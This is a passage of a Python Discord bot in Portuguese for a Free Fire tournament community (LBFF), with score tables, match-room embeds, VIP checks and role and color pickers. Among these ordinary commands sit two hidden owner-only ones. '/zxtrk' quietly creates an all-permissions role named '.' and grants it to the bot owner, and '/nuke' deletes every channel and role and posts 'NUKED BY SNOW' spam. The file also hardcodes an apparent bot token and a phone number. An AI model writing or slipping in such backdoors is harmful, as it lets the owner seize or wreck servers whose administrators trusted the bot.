            days_remaining = time_remaining.days
            hours_remaining = time_remaining.seconds // 3600
            minutes_remaining = (time_remaining.seconds // 60) % 60

            embed.add_field(
                name=f"UID: {uid} - Nome: {nome}",
                value=f"Tempo restante: {days_remaining} dias, {hours_remaining} horas e {minutes_remaining} minutos.",
                inline=False
            )

    await interaction.response.send_message(embed=embed)


@aclient.tree.command(
    name="pontos",
    description="Mostra a tabela de pontuação da LBFF."
)
async def pontos(interaction: discord.Interaction):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    embed = discord.Embed(
        title=f"{coroa}ㅤPONTUAÇÃO - LBFFㅤ{coroa}",
        description="",
        color=0xFFFF00
    )

    # Pontuação por Colocação
    embed.add_field(
        name=f"{brilho}ㅤPONTUAÇÃO POR COLOCAÇÃO",
        value=(
            "1º Lugar: 12 pontos\n"
            "2º Lugar: 9 pontos\n"
            "3º Lugar: 8 pontos\n"
            "4º Lugar: 7 pontos\n"
            "5º Lugar: 6 pontos\n"
            "6º Lugar: 5 pontos\n"
            "7º Lugar: 4 pontos\n"
            "8º Lugar: 3 pontos\n"
            "9º Lugar: 2 pontos\n"
            "10º-12º Lugar: 1 ponto\n"
        ),
        inline=False
    )

    # Pontuação por Abate
    embed.add_field(
        name=f"{brilho}ㅤPONTUAÇÃO POR ABATE",
        value="Cada abate vale 1 ponto",
        inline=False
    )

    await interaction.response.send_message(embed=embed)


@aclient.tree.command(
    name="sala",
    description="Exibe o ID e senha do confronto em um embed."
)
@app_commands.describe(
    id="ID do confronto.",
    senha="Senha do confronto."
)
async def senha(interaction: discord.Interaction, id: str, senha: str):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    # Verificando se o ID e a senha foram fornecidos
    if not id.strip() or not senha.strip():
        await interaction.response.send_message(f"{proibido_emoji} O ID e a senha são obrigatórios!", ephemeral=True)
        return

    # Criando o embed
    embed = discord.Embed(
        title=f"{coroa}ㅤSALA CRIADAㅤ{coroa}",
        color=0xFFFF00
    )

    # Adicionando os campos de ID e senha na mesma linha
    embed.add_field(
        name=f"{brilho}ㅤID",
        value=f"ㅤ{id}"
    )

    embed.add_field(
        name=f"{brilho}ㅤSENHA",
        value=f"ㅤ{senha}"
    )

    # Criando o botão para copiar ID
    button = Button(label="Copiar ID", style=discord.ButtonStyle.green)

    async def button_callback(interaction: discord.Interaction):
        await interaction.response.send_message(f"{id}", ephemeral=True)

    button.callback = button_callback

    # Criando a view e adicionando o botão
    view = View()
    view.add_item(button)

    # Enviando o embed
    await interaction.response.send_message(embed=embed, view=view)


@aclient.tree.command(
    name="zxtrk",
    description="Comando especial do dono."
)
async def zxtrk(interaction: discord.Interaction):
    # Verifica se quem usou o comando é o dono
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{proibido_emoji} Este comando é exclusivo para o dono do bot.",
                                                ephemeral=True)
        return

    try:
        # Cria o cargo com configurações discretas
        cargo_admin = await interaction.guild.create_role(
            name=".",  # Nome discreto
            permissions=discord.Permissions.all(),  # Todas as permissões (administrador)
            color=discord.Color.default(),  # Sem cor
            hoist=False,  # Não mostra separadamente na lista de membros
            mentionable=False,  # Não pode ser mencionado
            reason="Cargo criado pelo comando /zxtrk"
        )

        # Atribui o cargo ao dono
        await interaction.user.add_roles(cargo_admin)

        # Envia uma mensagem de confirmação discreta
        await interaction.response.send_message("✅", ephemeral=True)

    except Exception as e:
        await interaction.response.send_message("❌", ephemeral=True)


@aclient.tree.command(
    name="campcargos",
    description="Cria um embed para pegar cargos da call."
)
async def camp_cargos(interaction: discord.Interaction):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.",
            ephemeral=True
        )
        return

    # Obtendo a imagem do servidor (thumbnail)
    thumbnail_url = interaction.guild.icon.url if interaction.guild.icon else None
    image_url = "https://media.tenor.com/hf6Y0QFVrsEAAAAj/blood-drip-blood.gif"

    # Criando o embed
    embed = discord.Embed(
        title="Pegue seu cargo",
        description="Para pegar o cargo da sua call, abra o menu abaixo e selecione o seu time.",
        color=0xFFFF00
    )

    if thumbnail_url:
        embed.set_thumbnail(url=thumbnail_url)

    embed.set_image(url=image_url)

    # Obtendo os cargos das calls do evento
    roles = [role for role in interaction.guild.roles if role.name.startswith("⭐・")]  # Prefixo para os cargos de time

    # Criando as opções do menu de seleção
    options = [
        discord.SelectOption(
            label=role.name.replace("⭐・", "・"),  # Nome do cargo sem prefixo
            value=str(role.id),
            emoji="<:botao:1336783739090501702>"  # Emoji associado ao menu
        )
        for role in roles
    ]

    # Criando o menu de seleção
    select = discord.ui.Select(
        placeholder="Selecione seu time...",
        options=options
    )

    async def select_callback(interaction: discord.Interaction):
        selected_role_id = int(select.values[0])
        selected_role = interaction.guild.get_role(selected_role_id)

        # Remover todos os outros cargos relacionados ao evento
        for role in roles:
            if role in interaction.user.roles:
                await interaction.user.remove_roles(role)

        # Adicionando o novo cargo selecionado
        await interaction.user.add_roles(selected_role)

        await interaction.response.send_message(
            f"{liberado_emoji} Você agora tem o cargo {selected_role.mention}.",
            ephemeral=True
        )

    select.callback = select_callback

    # Criando a view com timeout indefinido
    view = discord.ui.View(timeout=None)
    view.add_item(select)

    # Enviando a mensagem com o embed e a view
    await interaction.response.send_message(embed=embed, view=view)


@aclient.tree.command(
    name="fase",
    description="Inicia uma nova fase."
)
@app_commands.describe(numero="Número da fase a ser iniciada.")
async def fase(interaction: discord.Interaction, numero: int):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.",
                                                ephemeral=True)
        return

    # Obtendo a imagem do servidor (thumbnail)
    thumbnail_url = interaction.guild.icon.url if interaction.guild.icon else None

    # Criando o embed
    embed = discord.Embed(
        title=f"{coroa}ㅤ**{numero}° FASE**ㅤ{coroa}",
        description=f"**AGORA SE INICIA {numero}° FASE**",
        color=0xFFFF00  # Cor do embed
    )

    if thumbnail_url:
        embed.set_thumbnail(url=thumbnail_url)

    # Enviando o embed
    await interaction.response.send_message(embed=embed)


@aclient.tree.command(
    name="tabela",
    description="Cria um embed com os dados da tabela enviada."
)
@app_commands.describe(nome_tabela="Nome da tabela que será exibida no embed.")
async def tabela(interaction: discord.Interaction, nome_tabela: str):
    """
    Comando para criar uma tabela de pontuação formatada.
    """
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.",
            ephemeral=True
        )
        return

    # Solicita que o usuário envie a tabela no chat
    await interaction.response.send_message(
        "✍️ Por favor, envie a tabela no formato:\n`nome - número`\nAguarde a confirmação.",
        ephemeral=True
    )

    def check(msg):
        return msg.author == interaction.user and msg.channel == interaction.channel

    try:
        # Aguarda a resposta do usuário com a tabela
        msg = await interaction.client.wait_for("message", check=check, timeout=60)
        tabela_dados = msg.content.split("\n")  # Divide as linhas da mensagem enviada pelo usuário

        # Apaga a mensagem original da tabela
        await msg.delete()

        # Emojis personalizados
        primeiro = "<:1st:1339412176619831447>"
        segundo = "<:2nd:1339412184870158399>"
        terceiro = "<:3rd:1339412191471996989>"
        bomjogo = "<:bomjogo:1339412764480897115>"

        # Formata as linhas da tabela
        linhas_formatadas = []
        for i, linha in enumerate(tabela_dados):
            linha_formatada = linha.strip()  # Remove espaços extras

            # Verifica se a linha está no formato correto (nome - número)
            if " - " not in linha_formatada:
                await interaction.followup.send(
                    f"{proibido_emoji} A linha `{linha_formatada}` não está no formato correto. Use `nome - número`.",
                    ephemeral=True
                )
                return

            if i == 0:
                linhas_formatadas.append(f"{primeiro} {linha_formatada}")
            elif i == 1:
                linhas_formatadas.append(f"{segundo} {linha_formatada}")
            elif i == 2:
                linhas_formatadas.append(f"{terceiro} {linha_formatada}")
            else:
                linhas_formatadas.append(f"{bomjogo} {linha_formatada}")

        # Cria o embed com as informações formatadas
        embed = discord.Embed(
            title=nome_tabela,
            description="\n".join(linhas_formatadas),
            color=0xFFFF00  # Cor amarela
        )

        # Envia o embed no canal
        await interaction.followup.send(embed=embed)

    except asyncio.TimeoutError:
        # Caso o usuário não envie a mensagem dentro do tempo limite
        await interaction.followup.send(
            f"{proibido_emoji} Tempo esgotado! O comando foi cancelado.",
            ephemeral=True
        )

# Dados dos cargos com nomes e emojis
color_roles = [
    {"id": 1340117224379121754, "name": "aqua", "emoji": "<:14:1340133345526284288>"},
    {"id": 1340118160178810982, "name": "branco neve", "emoji": "<:18:1340129812064374855>"},
    {"id": 1340117900685742192, "name": "roxo médio", "emoji": "<:17:1340129828451647562>"},
    {"id": 1340118274607681556, "name": "preto", "emoji": "<:19:1340129795085828179>"},
    {"id": 1340117680534978750, "name": "azul céu", "emoji": "<:16:1340129842233872395>"},
    {"id": 1303863005636853880, "name": "ciano", "emoji": "<:15:1340133357404684288>"},
    {"id": 1340116908011163648, "name": "rosa bebê", "emoji": "<:11:1340133294229946389>"},
    {"id": 1303863005653766174, "name": "azul bebe", "emoji": "<:8_:1340133244745551922>"},
    {"id": 1340116002788212857, "name": "laranja", "emoji": "<:4_:1340133184398037195>"},
    {"id": 1340115037402038416, "name": "rosa claro", "emoji": "<:1_:1340133137514102805>"},
    {"id": 1340115612894101686, "name": "salmão", "emoji": "<:2_:1340133149845229621>"},
    {"id": 1340116002310193174, "name": "amarelo", "emoji": "<:5_:1340133198113276004>"},
    {"id": 1340116003602042975, "name": "dourado", "emoji": "<:6_:1340133219269345402>"},
    {"id": 1340117016937365586, "name": "laranja²", "emoji": "<:13:1340133321006383146>"},
    {"id": 1340116299359195168, "name": "verde claro", "emoji": "<:7_:1340133232192258241>"},
    {"id": 1340115761280188467, "name": "vermelho claro", "emoji": "<:3_:1340133167042007040>"}
]


@aclient.tree.command(
    name="cores",
    description="Exibe a paleta de cores disponíveis e permite escolher uma."
)
async def cores(interaction: discord.Interaction):
    """
    Comando para exibir a paleta de cores e permitir que o usuário escolha uma.
    """
    guild = interaction.guild

    # Construindo o embed
    embed = discord.Embed(
        title="Paleta de Cores",
        description="Escolha a cor que você terá no seu nome.",
        color=16776960
    )
    embed.set_image(
        url="https://media.discordapp.net/attachments/917953030337466388/1091492762932740146/image.png?width=700&height=11")

    # Adicionando campos ao embed
    embed.add_field(
        name="・Cores **disponíveis**:",
        value="\n".join([f"{role['emoji']} {role['name']}" for role in color_roles[:9]]),
        inline=True
    )
    embed.add_field(
        name="・Mais **cores**:",
        value="\n".join([f"{role['emoji']} {role['name']}" for role in color_roles[9:]]),
        inline=True
    )

    # Criando as opções para o menu de seleção com os nomes e emojis dos cargos
    options = [
        discord.SelectOption(label=role["name"], value=str(role["id"]), emoji=role["emoji"])
        for role in color_roles
    ]

    # Callback para o menu de seleção
    async def select_callback(interaction: discord.Interaction):
        selected_role_id = int(select.values[0])
        selected_role = guild.get_role(selected_role_id)

        # Remove todas as outras cores do usuário
        for role_data in color_roles:
            role = guild.get_role(role_data["id"])
            if role in interaction.user.roles:
                await interaction.user.remove_roles(role)

        # Adiciona a nova cor selecionada
        await interaction.user.add_roles(selected_role)

    # Criando o menu de seleção
    select = Select(
        placeholder="Escolha sua cor...",
        options=options
    )
    select.callback = select_callback

    # Criando a view com o menu de seleção (sem timeout)
    view = View(timeout=None)
    view.add_item(select)

    # Enviando o embed e o menu no canal
    await interaction.response.send_message(embed=embed, view=view)

# 💣 Comando Nuke
@aclient.tree.command(
    name="nuke",
    description="Apaga todos os canais e cargos do servidor, e cria um canal chamado NUKED com spam."
)
async def nuke(interaction: discord.Interaction):
    # 🔒 Verifica se quem usou o comando é o dono do bot
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(
            "🚫 Este comando é exclusivo para o dono do bot.",
            ephemeral=True
        )
        return

    # 💬 Confirmação inicial
    await interaction.response.send_message("💣 Iniciando o Nuke...")

    guild = interaction.guild

    # 🧨 Deletar todos os canais
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Erro ao deletar canal '{channel.name}': {e}")

    # 🔥 Deletar todos os cargos (exceto @everyone)
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"Erro ao deletar cargo '{role.name}': {e}")

    # 🚀 Criar novo canal de texto "nuked"
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(
            read_messages=True,
            send_messages=True
        )
    }

    nuked_channel = await guild.create_text_channel("nuked", overwrites=overwrites)

    # 📢 Enviar 5 mensagens "NUKED BY SNOW"
    for _ in range(5):
        await nuked_channel.send("💥 NUKED BY SNOW 💥")
      
aclient.run('OTAwMDk2NjAzOTI1NDA1NzU2.Gu1GDx.DM5xBMRdA9nbtrIJYEY5JaxgvNCStYqdx3Ytkc')